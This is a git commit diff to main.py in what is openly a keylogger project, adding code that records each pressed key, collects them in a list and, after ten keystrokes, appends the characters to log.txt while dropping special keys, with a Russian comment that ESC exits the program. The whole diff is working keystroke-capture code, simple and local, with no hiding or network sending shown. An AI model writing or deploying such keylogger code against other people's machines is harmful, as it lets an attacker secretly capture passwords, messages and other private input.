9b0acbefa65a7631a669203431abe983b2b056d5
zoomka <rrarrk123@gmail.com>
2022-09-21 19:16:53 +0300

    recording the pressed buttons to a file

--- main.py
+++ main.py
@@ -11,9 +11,26 @@ class Keylogger:
     def on_press(self, key):
         print(f"{key} pressed")
 
-    def on_release(self, key):
+        self.key.append(key)
+        self.count+=1
+
+        if self.count >=10:
+            self.write_file(self.key)
+
+    def on_release(self, key):#закрытие програмы на кнопку ESC
         if key == Key.esc:
             return False
+
+
+    def write_file(self, key):
+        with open('log.txt','a') as file:
+            for key in self.key:
+                k = str(key).replace("'",'')
+
+                if k.find("space")>0:
+                    file.write("\n")
+                elif k.find("Key") == -1:
+                    file.write(k)
 
 
 if __name__ == "__main__":
